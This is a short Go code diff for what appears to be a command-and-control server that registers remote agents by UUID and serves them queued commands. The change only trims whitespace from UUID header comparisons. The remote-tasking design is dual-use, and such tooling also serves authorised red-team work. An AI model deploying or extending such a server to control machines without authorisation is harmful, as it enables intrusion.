@@ -8,6 +8,7 @@ import (
 	"log/slog"
 	"net/http"
 	"os"
+	"strings"
 	"time"
 
 	"github.com/google/uuid"
@@ -38,7 +39,7 @@ func requestHandler() http.HandlerFunc {
 			state.RegisteredAgents = append(state.RegisteredAgents, uuid.String())
 			mu.Unlock()
 			slog.Info("Registered agent: " + r.RemoteAddr + " with UUID: " + uuid.String())
-		} else if r.Header.Get("UUID") == state.SelectedAgent || "ALL" == state.SelectedAgent {
+		} else if strings.TrimSpace(r.Header.Get("UUID")) == state.SelectedAgent || "ALL" == state.SelectedAgent {
 			slog.Info("Connected Agent: \n")
 			slog.Info("Address: " + r.RemoteAddr)
 			slog.Info("Username: " + r.Header.Get("Username"))
@@ -80,7 +81,7 @@ func requestHandler() http.HandlerFunc {
 
 func requestCommand(w http.ResponseWriter, r *http.Request) {
 	if len(state.Tasks) != 0 {
-		if state.Tasks[0].Command != "" && state.Tasks[0].Agent == r.Header.Get("UUID") {
+		if state.Tasks[0].Command != "" && state.Tasks[0].Agent == strings.TrimSpace(r.Header.Get("UUID")) {
 			w.Write([]byte(state.Tasks[0].Command))
 			slog.Info("Command requested: " + state.Tasks[0].Command)
 			state.Tasks = state.Tasks[1:]
